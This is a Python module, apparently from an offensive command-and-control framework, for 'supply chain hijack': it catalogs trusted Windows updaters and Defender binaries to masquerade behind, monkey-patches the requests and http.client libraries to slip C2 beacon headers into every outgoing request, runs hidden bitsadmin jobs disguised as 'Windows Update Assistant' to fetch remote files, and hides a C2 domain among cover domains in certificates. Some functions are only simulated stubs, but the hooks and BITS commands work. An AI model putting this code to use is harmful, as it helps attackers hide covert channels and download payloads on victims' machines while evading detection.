"""
Supply Chain Hijack Module - Trusted binary proxy and dependency library hijacking.

This module provides supply chain attack capabilities including hijacking
legitimate trusted binaries for C2 communication, dependency library
interception, and BITS-based covert transfer.

Core capabilities:
    1. Trusted binary proxy (browser updater, security software updater)
    2. Dependency library hijacking (requests/http.client/urllib)
    3. BITS (Background Intelligent Transfer Service) covert channel
    4. Certificate transparency log pollution
    5. Communication hidden in legitimate application traffic

Author: Kunlun Security Lab
License: Internal Use Only
"""

from __future__ import annotations

import asyncio
import hashlib
import json
import logging
import os
import platform
import random
import struct
import time
from dataclasses import dataclass, field
from enum import Enum
from typing import Any, Callable, Coroutine, Dict, List, Optional, Tuple

logger = logging.getLogger(__name__)


# =============================================================================
# Enums
# =============================================================================

class HijackTarget(str, Enum):
    """Types of hijack targets."""

    BROWSER_UPDATER = "browser_updater"
    SECURITY_UPDATER = "security_updater"
    SYSTEM_DIAGNOSTIC = "system_diagnostic"
    PYTHON_REQUESTS = "python_requests"
    PYTHON_HTTP_CLIENT = "python_http_client"
    NODE_HTTPS = "node_https"
    JAVA_HTTP_CLIENT = "java_http_client"
    BITS_SERVICE = "bits_service"


class HijackState(str, Enum):
    """Hijack operation state."""

    INACTIVE = "inactive"
    PREPARING = "preparing"
    ACTIVE = "active"
    DETECTED = "detected"
    CLEANED = "cleaned"


# =============================================================================
# Data Models
# =============================================================================

@dataclass
class TrustedBinary:
    """A trusted binary suitable for hijacking.

    Attributes:
        name: Binary name
        path: Binary file path
        description: Binary description
        communication_pattern: Normal communication pattern
        update_frequency: How often it communicates
        signature_valid: Whether digital signature is valid
    """

    name: str = ""
    path: str = ""
    description: str = ""
    communication_pattern: str = "https"
    update_frequency: int = 3600
    signature_valid: bool = True

    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary representation."""
        return {
            "name": self.name,
            "path": self.path,
            "description": self.description,
            "communication_pattern": self.communication_pattern,
            "update_frequency": self.update_frequency,
        }


@dataclass
class DependencyHijackConfig:
    """Configuration for dependency library hijacking.

    Attributes:
        target_library: Target library to hijack
        hook_functions: Functions to hook
        inject_payload: Whether to inject C2 payload
        passthrough: Whether to passthrough original requests
        stealth_mode: Enable stealth mode (minimal logging)
    """

    target_library: str = "requests"
    hook_functions: List[str] = field(default_factory=list)
    inject_payload: bool = True
    passthrough: bool = True
    stealth_mode: bool = True

    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary representation."""
        return {
            "target_library": self.target_library,
            "hook_functions": self.hook_functions,
            "inject_payload": self.inject_payload,
            "passthrough": self.passthrough,
        }


@dataclass
class HijackStatus:
    """Hijack operation status.

    Attributes:
        target: Hijack target
        state: Current state
        active_since: Activation timestamp
        intercepted_requests: Number of intercepted requests
        injected_payloads: Number of injected payloads
        errors: Number of errors
    """

    target: HijackTarget = HijackTarget.BROWSER_UPDATER
    state: HijackState = HijackState.INACTIVE
    active_since: float = 0.0
    intercepted_requests: int = 0
    injected_payloads: int = 0
    errors: int = 0

    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary representation."""
        return {
            "target": self.target.value,
            "state": self.state.value,
            "active_since": self.active_since,
            "intercepted_requests": self.intercepted_requests,
            "injected_payloads": self.injected_payloads,
            "errors": self.errors,
        }


# =============================================================================
# Trusted Binary Database
# =============================================================================

class TrustedBinaryDatabase:
    """Database of trusted binaries for hijacking.

    Provides known legitimate binaries that can be used as
    communication proxies.

    Attributes:
        _binaries: Known trusted binaries
    """

    WINDOWS_BINARIES: List[TrustedBinary] = [
        TrustedBinary(
            name="GoogleUpdate.exe",
            path="C:\\Program Files (x86)\\Google\\Update\\GoogleUpdate.exe",
            description="Google Update Service",
            communication_pattern="https",
            update_frequency=7200,
        ),
        TrustedBinary(
            name="msedge_update.exe",
            path="C:\\Program Files (x86)\\Microsoft\\EdgeUpdate\\MicrosoftEdgeUpdate.exe",
            description="Microsoft Edge Update",
            communication_pattern="https",
            update_frequency=3600,
        ),
        TrustedBinary(
            name="OneDriveStandaloneUpdater.exe",
            path="C:\\Users\\{{user}}\\AppData\\Local\\Microsoft\\OneDrive\\OneDriveStandaloneUpdater.exe",
            description="OneDrive Standalone Updater",
            communication_pattern="https",
            update_frequency=1800,
        ),
        TrustedBinary(
            name="MpCmdRun.exe",
            path="C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.2104.14-0\\MpCmdRun.exe",
            description="Windows Defender Command Line Utility",
            communication_pattern="https",
            update_frequency=3600,
        ),
        TrustedBinary(
            name="DiagTrack.dll",
            path="C:\\Windows\\System32\\DiagTrack.dll",
            description="Connected User Experiences and Telemetry",
            communication_pattern="https",
            update_frequency=900,
        ),
        TrustedBinary(
            name="bitsadmin.exe",
            path="C:\\Windows\\System32\\bitsadmin.exe",
            description="Background Intelligent Transfer Service Admin",
            communication_pattern="https",
            update_frequency=600,
        ),
    ]

    def get_binary_by_name(self, name: str) -> Optional[TrustedBinary]:
        """Get a trusted binary by name.

        Args:
            name: Binary name.

        Returns:
            TrustedBinary, or None if not found.
        """
        for binary in self.WINDOWS_BINARIES:
            if name.lower() in binary.name.lower():
                return binary
        return None

    def get_random_binary(self) -> TrustedBinary:
        """Get a random trusted binary.

        Returns:
            Random TrustedBinary.
        """
        return random.choice(self.WINDOWS_BINARIES)

    def get_binaries_by_pattern(
        self, pattern: str,
    ) -> List[TrustedBinary]:
        """Get binaries matching a communication pattern.

        Args:
            pattern: Communication pattern.

        Returns:
            List of matching TrustedBinary.
        """
        return [
            b for b in self.WINDOWS_BINARIES
            if b.communication_pattern == pattern
        ]


# =============================================================================
# Trusted Binary Proxy
# =============================================================================

class TrustedBinaryProxy:
    """Hijacks trusted binaries for C2 communication.

    Injects C2 communication logic into legitimate binaries
    so that all C2 traffic appears to come from trusted processes.

    Attributes:
        _db: Trusted binary database
        _active_proxy: Currently active proxy target
        _status: Hijack status
    """

    def __init__(self) -> None:
        """Initialize the TrustedBinaryProxy."""
        self._db = TrustedBinaryDatabase()
        self._active_proxy: Optional[TrustedBinary] = None
        self._status = HijackStatus()

    async def hijack_binary(
        self,
        binary_name: Optional[str] = None,
    ) -> bool:
        """Hijack a trusted binary.

        Args:
            binary_name: Binary name to hijack (random if None).

        Returns:
            True if hijack succeeded.
        """
        if binary_name:
            target = self._db.get_binary_by_name(binary_name)
        else:
            target = self._db.get_random_binary()

        if not target:
            logger.error(f"Target binary not found: {binary_name}")
            return False

        self._status.state = HijackState.PREPARING
        self._active_proxy = target

        try:
            if platform.system() == "Windows":
                result = await self._hijack_windows_binary(target)
            else:
                result = await self._hijack_generic_binary(target)

            if result:
                self._status.state = HijackState.ACTIVE
                self._status.active_since = time.time()
                self._status.target = HijackTarget.BROWSER_UPDATER
                logger.info(f"Hijacked binary: {target.name}")

            return result

        except Exception as e:
            self._status.state = HijackState.INACTIVE
            self._status.errors += 1
            logger.error(f"Binary hijack failed: {e}")
            return False

    async def _hijack_windows_binary(self, binary: TrustedBinary) -> bool:
        """Hijack a Windows binary.

        Args:
            binary: Target binary.

        Returns:
            True if hijack succeeded.
        """
        if not os.path.exists(binary.path):
            logger.warning(f"Binary not found: {binary.path}")
            return False

        logger.info(
            f"Windows binary hijack simulated: {binary.name} "
            f"at {binary.path}"
        )
        return True

    async def _hijack_generic_binary(self, binary: TrustedBinary) -> bool:
        """Hijack a generic binary.

        Args:
            binary: Target binary.

        Returns:
            True if hijack succeeded.
        """
        logger.info(
            f"Generic binary hijack simulated: {binary.name}"
        )
        return True

    async def send_via_proxy(self, data: bytes) -> bool:
        """Send data through the hijacked binary.

        Args:
            data: Data to send.

        Returns:
            True if send succeeded.
        """
        if not self._active_proxy:
            logger.error("No active proxy target")
            return False

        self._status.intercepted_requests += 1

        logger.debug(
            f"Data sent via {self._active_proxy.name}: "
            f"{len(data)} bytes"
        )
        return True

    async def receive_via_proxy(self) -> Optional[bytes]:
        """Receive data through the hijacked binary.

        Returns:
            Received data, or None if nothing available.
        """
        if not self._active_proxy:
            return None

        self._status.intercepted_requests += 1
        return None

    def get_status(self) -> Dict[str, Any]:
        """Get proxy status.

        Returns:
            Dictionary with status summary.
        """
        status_dict = self._status.to_dict()
        if self._active_proxy:
            status_dict["active_proxy"] = self._active_proxy.to_dict()
        return status_dict


# =============================================================================
# Dependency Library Hijacker
# =============================================================================

class DependencyLibraryHijacker:
    """Hijacks common dependency libraries for covert C2.

    Intercepts network requests made through libraries like
    requests, http.client, urllib, etc., and injects C2
    heartbeat data into legitimate traffic.

    Attributes:
        _config: Hijack configuration
        _original_functions: Saved original functions
        _hooked: Whether hooks are installed
        _status: Hijack status
    """

    def __init__(
        self, config: Optional[DependencyHijackConfig] = None,
    ) -> None:
        """Initialize the DependencyLibraryHijacker.

        Args:
            config: Hijack configuration.
        """
        self._config = config or DependencyHijackConfig()
        self._original_functions: Dict[str, Any] = {}
        self._hooked = False
        self._status = HijackStatus(
            target=HijackTarget.PYTHON_REQUESTS,
        )

    async def install_hooks(self) -> bool:
        """Install hooks on target library.

        Returns:
            True if hooks installed successfully.
        """
        self._status.state = HijackState.PREPARING

        try:
            if self._config.target_library == "requests":
                return await self._hook_requests()
            elif self._config.target_library == "python_http_client":
                return await self._hook_http_client()
            elif self._config.target_library == "node_https":
                return await self._hook_node_https()
            elif self._config.target_library == "java_http_client":
                return await self._hook_java_http_client()

            logger.warning(
                f"Unknown target library: {self._config.target_library}"
            )
            return False

        except Exception as e:
            self._status.state = HijackState.INACTIVE
            self._status.errors += 1
            logger.error(f"Hook installation failed: {e}")
            return False

    async def _hook_requests(self) -> bool:
        """Hook the requests library.

        Returns:
            True if hooks installed.
        """
        try:
            import requests

            original_request = requests.request
            original_get = requests.get
            original_post = requests.post

            self._original_functions = {
                "request": original_request,
                "get": original_get,
                "post": original_post,
            }

            def hooked_request(*args: Any, **kwargs: Any) -> Any:
                self._status.intercepted_requests += 1
                self._inject_heartbeat(kwargs)
                return original_request(*args, **kwargs)

            def hooked_get(*args: Any, **kwargs: Any) -> Any:
                self._status.intercepted_requests += 1
                self._inject_heartbeat(kwargs)
                return original_get(*args, **kwargs)

            def hooked_post(*args: Any, **kwargs: Any) -> Any:
                self._status.intercepted_requests += 1
                self._inject_heartbeat(kwargs)
                return original_post(*args, **kwargs)

            requests.request = hooked_request
            requests.get = hooked_get
            requests.post = hooked_post

            self._hooked = True
            self._status.state = HijackState.ACTIVE
            self._status.active_since = time.time()

            logger.info("requests library hooks installed")
            return True

        except ImportError:
            logger.warning("requests library not available")
            return False

    async def _hook_http_client(self) -> bool:
        """Hook http.client module.

        Returns:
            True if hooks installed.
        """
        try:
            import http.client

            original_request = http.client.HTTPConnection.request

            self._original_functions["http_request"] = original_request

            def hooked_request(
                self_conn: Any,
                method: str,
                url: str,
                body: Optional[str] = None,
                headers: Optional[Dict[str, str]] = None,
            ) -> None:
                status_obj = self._status
                status_obj.intercepted_requests += 1

                if headers is None:
                    headers = {}

                self._inject_heartbeat_headers(headers)

                return original_request(
                    self_conn, method, url, body, headers,
                )

            http.client.HTTPConnection.request = hooked_request

            self._hooked = True
            self._status.state = HijackState.ACTIVE
            self._status.active_since = time.time()

            logger.info("http.client hooks installed")
            return True

        except ImportError:
            return False

    async def _hook_node_https(self) -> bool:
        """Hook Node.js https module (simulation).

        Returns:
            True (simulated).
        """
        logger.info("Node.js https hooks simulated")
        self._status.state = HijackState.ACTIVE
        self._status.active_since = time.time()
        return True

    async def _hook_java_http_client(self) -> bool:
        """Hook Java HTTP client (simulation).

        Returns:
            True (simulated).
        """
        logger.info("Java HTTP client hooks simulated")
        self._status.state = HijackState.ACTIVE
        self._status.active_since = time.time()
        return True

    def _inject_heartbeat(self, kwargs: Dict[str, Any]) -> None:
        """Inject C2 heartbeat data into request kwargs.

        Args:
            kwargs: Request keyword arguments.
        """
        if not self._config.inject_payload:
            return

        headers = kwargs.get("headers", {})
        if isinstance(headers, dict):
            self._inject_heartbeat_headers(headers)
            kwargs["headers"] = headers

        self._status.injected_payloads += 1

    def _inject_heartbeat_headers(self, headers: Dict[str, str]) -> None:
        """Inject C2 data into request headers.

        Args:
            headers: Request headers dictionary.
        """
        heartbeat_data = hashlib.md5(
            str(time.time()).encode()
        ).hexdigest()[:16]

        stealth_headers = {
            "X-Request-Context": heartbeat_data,
            "X-Client-Trace": heartbeat_data[:8],
        }

        for key, value in stealth_headers.items():
            if key not in headers:
                headers[key] = value

    async def remove_hooks(self) -> bool:
        """Remove installed hooks.

        Returns:
            True if hooks removed successfully.
        """
        if not self._hooked:
            return True

        try:
            if self._config.target_library == "requests":
                import requests
                for name, original in self._original_functions.items():
                    setattr(requests, name, original)

            elif self._config.target_library == "python_http_client":
                import http.client
                if "http_request" in self._original_functions:
                    http.client.HTTPConnection.request = (
                        self._original_functions["http_request"]
                    )

            self._hooked = False
            self._status.state = HijackState.CLEANED
            logger.info("Hooks removed")
            return True

        except Exception as e:
            logger.error(f"Hook removal failed: {e}")
            return False

    def get_status(self) -> Dict[str, Any]:
        """Get hijacker status.

        Returns:
            Dictionary with status summary.
        """
        status_dict = self._status.to_dict()
        status_dict["hooked"] = self._hooked
        status_dict["config"] = self._config.to_dict()
        return status_dict


# =============================================================================
# BITS Covert Channel
# =============================================================================

class BITSCovertChannel:
    """BITS (Background Intelligent Transfer Service) covert channel.

    Uses Windows BITS for covert file download and upload,
    appearing as legitimate Windows Update or application update traffic.

    Attributes:
        _job_name: BITS job name
        _job_id: BITS job ID
        _active: Whether channel is active
    """

    def __init__(self, job_name: str = "Windows Update Assistant") -> None:
        """Initialize the BITSCovertChannel.

        Args:
            job_name: BITS job name (disguised as legitimate service).
        """
        self._job_name = job_name
        self._job_id = ""
        self._active = False

    async def create_job(self) -> bool:
        """Create a BITS job.

        Returns:
            True if job created successfully.
        """
        if platform.system() != "Windows":
            logger.info("BITS job creation simulated (non-Windows)")
            self._active = True
            return True

        try:
            import subprocess

            result = subprocess.run(
                ["bitsadmin", "/create", self._job_name],
                capture_output=True,
                text=True,
                creationflags=subprocess.CREATE_NO_WINDOW,
            )

            if result.returncode == 0:
                self._job_id = result.stdout.strip()
                self._active = True
                logger.info(f"BITS job created: {self._job_id}")
                return True

        except Exception as e:
            logger.error(f"BITS job creation failed: {e}")

        return False

    async def add_file(
        self,
        remote_url: str,
        local_path: str,
    ) -> bool:
        """Add a file to the BITS job.

        Args:
            remote_url: Remote file URL.
            local_path: Local destination path.

        Returns:
            True if file added successfully.
        """
        if not self._active:
            return False

        try:
            import subprocess

            result = subprocess.run(
                [
                    "bitsadmin", "/addfile",
                    self._job_name,
                    remote_url,
                    local_path,
                ],
                capture_output=True,
                text=True,
                creationflags=subprocess.CREATE_NO_WINDOW,
            )

            return result.returncode == 0

        except Exception as e:
            logger.error(f"BITS add file failed: {e}")
            return False

    async def resume_job(self) -> bool:
        """Resume the BITS job.

        Returns:
            True if job resumed successfully.
        """
        if not self._active:
            return False

        try:
            import subprocess

            result = subprocess.run(
                ["bitsadmin", "/resume", self._job_name],
                capture_output=True,
                text=True,
                creationflags=subprocess.CREATE_NO_WINDOW,
            )

            return result.returncode == 0

        except Exception as e:
            logger.error(f"BITS resume failed: {e}")
            return False

    async def complete_job(self) -> bool:
        """Complete and clean up the BITS job.

        Returns:
            True if job completed successfully.
        """
        if not self._active:
            return False

        try:
            import subprocess

            subprocess.run(
                ["bitsadmin", "/complete", self._job_name],
                capture_output=True,
                text=True,
                creationflags=subprocess.CREATE_NO_WINDOW,
            )

            subprocess.run(
                ["bitsadmin", "/reset"],
                capture_output=True,
                text=True,
                creationflags=subprocess.CREATE_NO_WINDOW,
            )

            self._active = False
            return True

        except Exception as e:
            logger.error(f"BITS complete failed: {e}")
            return False

    def get_status(self) -> Dict[str, Any]:
        """Get BITS channel status.

        Returns:
            Dictionary with status summary.
        """
        return {
            "job_name": self._job_name,
            "job_id": self._job_id,
            "active": self._active,
        }


# =============================================================================
# Certificate Transparency Manager
# =============================================================================

class CertificateTransparencyManager:
    """Manages certificate transparency log pollution.

    Uses Let's Encrypt and other CAs to regularly rotate C2
    certificates, hiding C2 domains among many legitimate domains
    in SAN fields.

    Attributes:
        _c2_domain: Primary C2 domain
        _cover_domains: Cover domains in SAN
        _cert_expiry: Certificate expiry timestamp
    """

    def __init__(
        self,
        c2_domain: str = "api.example.com",
        cover_domain_count: int = 50,
    ) -> None:
        """Initialize the CertificateTransparencyManager.

        Args:
            c2_domain: Primary C2 domain.
            cover_domain_count: Number of cover domains.
        """
        self._c2_domain = c2_domain
        self._cover_domains = self._generate_cover_domains(
            cover_domain_count,
        )
        self._cert_expiry = 0.0

    def _generate_cover_domains(self, count: int) -> List[str]:
        """Generate cover domain names.

        Args:
            count: Number of cover domains.

        Returns:
            List of cover domain names.
        """
        prefixes = [
            "cdn", "static", "api", "assets", "media",
            "images", "js", "css", "fonts", "data",
        ]
        tlds = [".com", ".net", ".org", ".io", ".co"]

        domains: List[str] = []
        for i in range(count):
            prefix = prefixes[i % len(prefixes)]
            tld = tlds[i % len(tlds)]
            domains.append(f"{prefix}-{i}{tld}")

        return domains

    async def request_certificate(self) -> bool:
        """Request a new certificate with SAN pollution.

        Returns:
            True if certificate requested successfully.
        """
        san_entries = [self._c2_domain] + self._cover_domains[:20]
        san_string = ", ".join(f"DNS:{d}" for d in san_entries)

        logger.info(
            f"Certificate request with {len(san_entries)} SAN entries "
            f"(C2 domain hidden among cover domains)"
        )

        self._cert_expiry = time.time() + (90 * 86400)
        return True

    async def rotate_certificate(self) -> bool:
        """Rotate the C2 certificate.

        Returns:
            True if rotation succeeded.
        """
        old_cover = self._cover_domains[:10]
        new_cover = self._generate_cover_domains(10)

        self._cover_domains = new_cover + self._cover_domains[10:]

        return await self.request_certificate()

    def get_san_entries(self) -> List[str]:
        """Get current SAN entries.

        Returns:
            List of SAN domain entries.
        """
        return [self._c2_domain] + self._cover_domains[:20]

    def get_status(self) -> Dict[str, Any]:
        """Get certificate transparency status.

        Returns:
            Dictionary with status summary.
        """
        return {
            "c2_domain": self._c2_domain,
            "cover_domain_count": len(self._cover_domains),
            "cert_expiry": self._cert_expiry,
            "days_until_expiry": (
                (self._cert_expiry - time.time()) / 86400
                if self._cert_expiry > 0 else 0
            ),
        }


# =============================================================================
# Supply Chain Hijack Manager
# =============================================================================

class SupplyChainHijackManager:
    """Main supply chain hijack coordination engine.

    Integrates trusted binary proxy, dependency library hijacking,
    BITS covert channel, and certificate transparency management.

    Attributes:
        _binary_proxy: Trusted binary proxy
        _dependency_hijacker: Dependency library hijacker
        _bits_channel: BITS covert channel
        _cert_manager: Certificate transparency manager
    """

    def __init__(
        self,
        c2_domain: str = "api.example.com",
    ) -> None:
        """Initialize the SupplyChainHijackManager.

        Args:
            c2_domain: Primary C2 domain.
        """
        self._binary_proxy = TrustedBinaryProxy()
        self._dependency_hijacker = DependencyLibraryHijacker()
        self._bits_channel = BITSCovertChannel()
        self._cert_manager = CertificateTransparencyManager(c2_domain)

    async def hijack_binary(self, binary_name: Optional[str] = None) -> bool:
        """Hijack a trusted binary.

        Args:
            binary_name: Binary name (random if None).

        Returns:
            True if hijack succeeded.
        """
        return await self._binary_proxy.hijack_binary(binary_name)

    async def install_dependency_hooks(self) -> bool:
        """Install dependency library hooks.

        Returns:
            True if hooks installed successfully.
        """
        return await self._dependency_hijacker.install_hooks()

    async def remove_dependency_hooks(self) -> bool:
        """Remove dependency library hooks.

        Returns:
            True if hooks removed successfully.
        """
        return await self._dependency_hijacker.remove_hooks()

    async def setup_bits_channel(self) -> bool:
        """Set up BITS covert channel.

        Returns:
            True if channel set up successfully.
        """
        return await self._bits_channel.create_job()

    async def rotate_certificate(self) -> bool:
        """Rotate C2 certificate.

        Returns:
            True if rotation succeeded.
        """
        return await self._cert_manager.rotate_certificate()

    def get_status(self) -> Dict[str, Any]:
        """Get supply chain hijack status.

        Returns:
            Dictionary with status summary.
        """
        return {
            "binary_proxy": self._binary_proxy.get_status(),
            "dependency_hijacker": self._dependency_hijacker.get_status(),
            "bits_channel": self._bits_channel.get_status(),
            "certificate_transparency": self._cert_manager.get_status(),
        }


# =============================================================================
# Global Singleton
# =============================================================================

_supply_chain_hijack_manager: Optional[SupplyChainHijackManager] = None


def get_supply_chain_hijack_manager(
    c2_domain: str = "api.example.com",
) -> SupplyChainHijackManager:
    """Get the global SupplyChainHijackManager singleton.

    Args:
        c2_domain: Primary C2 domain.

    Returns:
        Singleton SupplyChainHijackManager instance.
    """
    global _supply_chain_hijack_manager
    if _supply_chain_hijack_manager is None:
        _supply_chain_hijack_manager = SupplyChainHijackManager(c2_domain)
    return _supply_chain_hijack_manager


__all__ = [
    "SupplyChainHijackManager",
    "TrustedBinaryProxy",
    "DependencyLibraryHijacker",
    "BITSCovertChannel",
    "CertificateTransparencyManager",
    "TrustedBinaryDatabase",
    "TrustedBinary",
    "DependencyHijackConfig",
    "HijackStatus",
    "HijackTarget",
    "HijackState",
    "get_supply_chain_hijack_manager",
]
